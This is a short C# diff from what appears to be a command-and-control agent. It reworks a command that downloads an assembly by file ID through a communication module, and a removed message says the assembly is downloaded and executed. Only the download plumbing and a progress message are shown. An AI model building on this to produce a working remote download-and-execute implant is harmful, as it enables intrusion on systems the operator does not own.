@@ -15,14 +15,8 @@ namespace Agent.Commands
 
         public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
         {
-            if (task.SplittedArgs.Length == 0)
-            {
-                result.Result = "Please specify the name of the assembly to download & execute!";
-                return;
-            }
-
-            var fileName = task.SplittedArgs[0];
-            var fileContent = commm.Download(fileName, a =>
+            var fileName = task.FileName;
+            var fileContent = commm.Download(task.FileId, a =>
             {
                 result.Info = $"Downloading {fileName} ({a}%)";
                 commm.SendResult(result);
